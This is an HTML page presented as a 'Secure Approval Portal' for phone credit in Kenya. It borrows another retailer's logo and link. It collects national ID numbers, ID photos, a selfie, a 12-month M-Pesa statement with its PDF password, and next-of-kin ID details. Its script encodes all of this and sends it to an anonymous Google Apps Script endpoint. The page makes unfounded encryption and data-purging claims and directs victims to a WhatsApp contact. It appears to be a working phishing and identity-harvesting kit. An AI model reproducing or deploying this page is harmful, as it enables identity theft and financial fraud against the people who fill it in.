<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Creditphoneslimited | Secure Approval Portal</title>
    <style>
        :root { 
            --primary-blue: #0056b3; 
            --soft-bg: #fdfdfd; 
            --text-dark: #1a1a1a;
            --border-light: #e5e7eb;
            --success-green: #166534;
            --whatsapp-green: #25D366;
            --trust-blue: #f0f7ff;
        }
        
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            background-color: #f3f4f6; 
            padding: 20px 15px; 
            margin: 0; 
            color: var(--text-dark); 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
        }

        .container { 
            background: #ffffff; 
            padding: 30px 20px; 
            border-radius: 20px; 
            max-width: 450px; 
            width: 100%; 
            box-shadow: 0 4px 25px rgba(0,0,0,0.05); 
            border: 1px solid var(--border-light);
        }

        .brand-header { text-align: center; margin-bottom: 15px; }
        .brand-header h1 { 
            color: var(--text-dark); 
            font-size: 1.1em; 
            text-transform: uppercase; 
            letter-spacing: 1.5px; 
            font-weight: 800;
            margin: 0;
        }

        .price-list-btn {
            display: block;
            text-align: center;
            background: #fff;
            color: var(--primary-blue);
            padding: 12px;
            border: 1.5px solid var(--primary-blue);
            border-radius: 50px;
            text-decoration: none;
            font-size: 0.8em;
            font-weight: 700;
            margin: 10px 0 20px 0;
            transition: 0.2s;
        }
        .price-list-btn:hover { background: #f0f7ff; }

        .agent-status {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            background: #f0fdf4;
            color: var(--success-green);
            padding: 8px;
            border-radius: 50px;
            font-size: 0.75em;
            font-weight: 600;
            margin-bottom: 20px;
        }
        .dot { height: 8px; width: 8px; background-color: #22c55e; border-radius: 50%; display: inline-block; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }

        .secure-note {
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            padding: 12px;
            border-radius: 12px;
            font-size: 0.75em;
            color: #64748b;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .trust-badge {
            background: var(--trust-blue);
            color: #003d7a;
            padding: 10px;
            border-radius: 8px;
            font-size: 0.7em;
            margin-top: 8px;
            display: flex;
            align-items: flex-start;
            gap: 6px;
            border: 1px solid #cce3ff;
        }

        label { display: block; margin-top: 18px; font-weight: 700; font-size: 0.8em; color: #374151; }
        
        input, select { 
            width: 100%; 
            padding: 14px; 
            margin-top: 6px; 
            border: 1.5px solid var(--border-light); 
            border-radius: 12px; 
            box-sizing: border-box; 
            font-size: 16px; 
            background-color: #f9fafb;
            color: #000;
        }

        input:focus { border-color: var(--text-dark); background-color: #fff; outline: none; }

        .upload-section {
            background: #ffffff;
            border: 1.5px dashed var(--border-light);
            padding: 15px;
            border-radius: 12px;
            margin-top: 6px;
        }

        .btn-submit { 
            background: var(--text-dark); 
            color: white; 
            padding: 18px; 
            border: none; 
            border-radius: 14px; 
            width: 100%; 
            margin-top: 25px; 
            font-weight: 700; 
            font-size: 1em; 
            cursor: pointer; 
            transition: 0.3s;
        }

        .whatsapp-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            background: #fff;
            color: var(--whatsapp-green);
            padding: 15px;
            border: 2px solid var(--whatsapp-green);
            border-radius: 14px;
            width: 100%;
            margin-top: 12px;
            font-weight: 700;
            font-size: 0.9em;
            text-decoration: none;
            box-sizing: border-box;
            transition: 0.2s;
        }
        .whatsapp-btn:hover { background: #f0fff4; }

        .footer { text-align: center; font-size: 0.7em; color: #9ca3af; margin: 30px 0; line-height: 1.6; }
        
        .hint-text { font-size: 0.82em; color: #6b7280; font-weight: 400; display: block; margin-top: 2px; }
    </style>
</head>
<body>

<div class="container">
    <div class="brand-header">
        <h1>Creditphoneslimited</h1>
        <img src="https://mophones.co/cdn/shop/files/MO-Logo-01_160x.png?v=1691582743" width="90" style="margin-top:10px;">
    </div>

    <a href="https://mophones.co" target="_blank" class="price-list-btn">üìä VIEW FULL PRICE LIST & DEPOSITS</a>

    <div class="agent-status">
        <span class="dot"></span> 24/7 Verified Approval Server
    </div>

    <form id="ironCladPortal">
        <label>Your County/Location</label>
        <select name="region" required>
            <option value="" disabled selected>Select your location</option>
            <option value="nairobi county">Nairobi County</option>
            <option value="kiambu county">Kiambu County</option>
            <option value="machakos town">Machakos Town</option>
            <option value="nakuru town">Nakuru Town</option>
            <option value="kajiado town">Kajiado Town & Environs</option>
        </select>

        <label>Preferred Phone Brand</label>
        <select name="phone_brand" required>
            <option value="" disabled selected>Select Brand</option>
            <option value="iphone">iPhone</option>
            <option value="samsung">Samsung</option>
        </select>

        <label>Phone Model</label>
        <input type="text" name="phone_model" placeholder="e.g. iPhone 13 or Samsung A25" required>

        <label>Full Names (As they appear on ID)</label>
        <input type="text" name="full_name" placeholder="Enter your 3 names" required>

        <label>Email Address</label>
        <input type="email" name="customer_email" placeholder="email@example.com" required>

        <label>National ID Number</label>
        <input type="text" name="id_number" maxlength="8" pattern="\d*" title="Please enter a valid 8-digit ID number" placeholder="Enter ID Number" required>

        <div style="margin-top:30px; border-top: 1px solid #f3f4f6; padding-top: 20px;">
            <p style="font-size: 0.75em; font-weight: 800; color: var(--primary-blue);">üîí SECURE DOCUMENT UPLOAD</p>
        </div>

        <div class="secure-note">
            <span>üõ°Ô∏è</span>
            <span>Data is encrypted. Documents are automatically purged after limit verification.</span>
        </div>

        <label>National ID (Front & Back)</label>
        <div class="upload-section">
            <span style="font-size: 0.7em; font-weight: 700; color: #64748b;">ID FRONT:</span> 
            <input type="file" name="id_front" accept="image/*" required>
        </div>
        <div class="upload-section" style="margin-top:10px;">
            <span style="font-size: 0.7em; font-weight: 700; color: #64748b;">ID BACK:</span> 
            <input type="file" name="id_back" accept="image/*" required>
        </div>

        <label>Your Selfie (Identity Check)
            <span class="hint-text">(No headgear/hats and use a clear background)</span>
        </label>
        <div class="upload-section">
            <input type="file" name="selfie" accept="image/*" required>
        </div>

        <label>M-Pesa Statement (Last 12 Months PDF)
            <span class="hint-text">(Request through *334#, select My Accounts)</span>
        </label>
        <div class="upload-section">
            <input type="file" name="mpesa_statement" accept=".pdf" required>
        </div>
        <div class="trust-badge">
            <span>üí°</span>
            <span><strong>Why 12 Months?</strong> We review your long-term patterns so that a single slow month doesn't stop your approval!</span>
        </div>

        <label>Statement PDF Password</label>
        <input type="text" name="mpesa_password" placeholder="Enter Statement password" required style="margin-top:5px;">

        <div style="margin-top:30px; border-top: 1px solid #f3f4f6; padding-top: 20px;">
            <p style="font-size: 0.75em; font-weight: 800; color: #111;">NEXT OF KIN INFORMATION</p>
        </div>
        
        <label>Next of Kin Full Name</label>
        <input type="text" name="nok_name" placeholder="Full Name" required>

        <label>Next of Kin ID Number</label>
        <input type="text" name="nok_id" maxlength="8" pattern="\d*" title="Please enter a valid 8-digit ID number" placeholder="Enter ID Number" required>

        <label>Next of Kin Phone Number</label>
        <input type="text" name="nok_contact" value="+254" required>

        <button type="submit" class="btn-submit" id="submitBtn">
            <span id="btnText">Submit Secured Application</span>
        </button>

        <a href="https://wa.me/254112384099?text=Hello,%20I%20need%20help%20with%20my%20Creditphoneslimited%20application." class="whatsapp-btn" target="_blank">
            üí¨ WhatsApp for Live Assistance
        </a>
    </form>
</div>

<div class="footer">
    Verified Portal: <strong>mo_leads_portal</strong><br>
    Pioneer House, Kimathi Street, Nairobi.<br>
    <span style="color:var(--success-green);">‚óè SSL Secure Connection Active</span><br>
    ¬© 2026 Creditphoneslimited
</div>

<script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbwfOQ-yWbi5075T-_h-NnCr8vyHlpUYNGrM4gO1W3f3o2VT1kYKbEdaJHWhPtQhLjh1/exec';
    const form = document.getElementById('ironCladPortal');
    const btn = document.getElementById('submitBtn');
    const btnText = document.getElementById('btnText');

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        btn.disabled = true;
        btn.style.opacity = "0.7";
        btnText.innerHTML = "‚è≥ Verifying Data... Please wait";

        const convertBase64 = (file) => {
            return new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.readAsDataURL(file);
                reader.onload = () => resolve(reader.result);
                reader.onerror = error => reject(error);
            });
        };

        try {
            const idFrontBase64 = await convertBase64(form.id_front.files[0]);
            const idBackBase64 = await convertBase64(form.id_back.files[0]);
            const selfieBase64 = await convertBase64(form.selfie.files[0]);
            const mpesaBase64 = await convertBase64(form.mpesa_statement.files[0]);

            const payload = {
                region: form.region.value,
                phone_brand: form.phone_brand.value,
                preferred_phone: form.phone_model.value,
                full_name: form.full_name.value,
                customer_email: form.customer_email.value,
                id_number: form.id_number.value,
                mpesa_password: form.mpesa_password.value,
                nok_name: form.nok_name.value,
                nok_id: form.nok_id.value,
                nok_contact: form.nok_contact.value,
                id_front: idFrontBase64,
                id_back: idBackBase64,
                selfie: selfieBase64,
                mpesa_statement: mpesaBase64
            };

            await fetch(scriptURL, {
                method: 'POST',
                mode: 'no-cors',
                cache: 'no-cache',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            btnText.innerHTML = "‚úÖ Application Success";
            btn.style.backgroundColor = "#166534";
            btn.style.opacity = "1";
            
            alert("APPLICATION SUCCESSFUL!\n\nOur credit team has received your documents. We will review your transaction consistency and contact you via WhatsApp (+254112384099) within 15-30 minutes with your approval status.");
            
            form.reset();
            btn.disabled = false;
            btnText.innerHTML = "Submit Secured Application";
            btn.style.backgroundColor = "";

        } catch (error) {
            btn.disabled = false;
            btn.style.opacity = "1";
            btnText.innerHTML = "Submit Secured Application";
            alert("Error: Internet connection issue or file too large. Please ensure your PDF is under 5MB and try again.");
            console.error('Error!', error);
        }
    });
</script>

</body>
</html>
